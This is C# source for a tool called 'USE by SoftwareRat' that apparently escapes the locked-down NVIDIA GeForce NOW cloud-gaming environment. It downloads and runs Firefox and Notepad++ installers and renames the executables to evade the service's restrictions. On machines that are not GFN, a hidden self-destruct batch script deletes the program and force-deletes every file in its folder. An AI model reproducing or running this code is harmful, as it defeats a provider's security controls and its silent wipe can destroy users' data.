using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Permissions;
using System.Threading;

namespace USE_CSharp_Edition
{
    class Program
    {

        static void InitiateSelfDestructSequence()
        {
            string batchScriptName = Path.GetTempPath().ToString() + "f.bat";
            using (StreamWriter writer = File.AppendText(batchScriptName))
            {
                writer.WriteLine(":Loop");
                writer.WriteLine("Tasklist /fi \"PID eq " + Process.GetCurrentProcess().Id.ToString() + "\" | find \":\"");
                writer.WriteLine("if Errorlevel 1 (");
                writer.WriteLine("  Timeout /T 1 /Nobreak");
                writer.WriteLine("  Goto Loop");
                writer.WriteLine(")");
                writer.WriteLine("Del \"" + (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"");
                writer.WriteLine("cd \"" + Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\"");
                writer.WriteLine("del . /F /Q");
            }
            Process.Start(new ProcessStartInfo() { Arguments = "/C " + batchScriptName + " & Del " + batchScriptName, WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe" });
        }
        static void Main(string[] args)
        {
            Console.Title = "[#] USE by SoftwareRat [v.3.0] - C# Edition [#]";
            if (File.Exists(@"C:\Windows\gfndesktop.exe") != true || Directory.Exists(@"C:\asgard") != true || Directory.Exists(@"C:\Users\kiosk") != true || Directory.Exists(@"C:\Users\xen") != true || Directory.Exists(@"C:\Users\kiosk\Documents\Dummy") != true)
            {
                InitiateSelfDestructSequence();
                Application.Exit();
            }
            else
            {
                Console.BackgroundColor = ConsoleColor.Green;
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("NVIDIA GeForce NOW System detected!");
                Console.ResetColor();
                Console.WriteLine("Preparing files...");

                WebClient webClient = new WebClient();

                //Firefox installation
                string FfSetup = @"C:\Program Files (x86)\Steam\FirefoxSetup.exe";
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Firefox");
                webClient.DownloadFile("https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US", FfSetup);
                var p = Process.Start(@"C:\Program Files (x86)\Steam\FirefoxSetup.exe", "/DesktopShortcut=false" + "/InstallDirectoryPath=C:\\Users\\kiosk\\AppData\\Local\\Firefox");
                Console.WriteLine("Hit OK!");
                p.WaitForExit();
                System.IO.File.Move(@"C:\Users\kiosk\AppData\Local\Firefox\firefox.exe", @"C:\Users\kiosk\AppData\Local\Firefox\icefox.exe");
                string Firefox = @"C:\Users\kiosk\AppData\Local\Firefox\icefox.exe";
                Process ff = new Process();
                ff.StartInfo.FileName = Firefox;
                ff.Start();

                //Notepad++ installation
                Directory.CreateDirectory(@"C:\Users\kiosk\AppData\Local\Notepad++");
                string npp = @"C:\Users\kiosk\AppData\Local\Notepad++\npp.7.8.8.bin.x64.7z";
                webClient.DownloadFile("https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.8/npp.7.8.8.bin.x64.7z", npp);
                Process nppextract = new Process();
                nppextract.StartInfo.FileName = @"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\sugus.exe";
                nppextract.StartInfo.Arguments = "x C:\\Users\\kiosk\\AppData\\Local\\Notepad++\\npp.7.8.8.bin.x64.7z";
                nppextract.StartInfo.WorkingDirectory = @"C:\Users\kiosk\AppData\Local\Notepad++";
                nppextract.Start();
                File.Copy(@"C:\Users\kiosk\AppData\Local\Notepad\notepad++.exe",  @"C:\Users\kiosk\AppData\Local\Notepad\notite.exe", true);

                //Only for developers, remove in the public release!
                Console.BackgroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("CHECK FOR ANY PROBLEMS");
                Console.ReadLine();
                //Finish
                Console.BackgroundColor = ConsoleColor.Yellow;
                Console.ForegroundColor = ConsoleColor.Black;
                Console.WriteLine("Have fun with testing USE :)");
                Thread.Sleep(5000);
            }
        }
    }
}
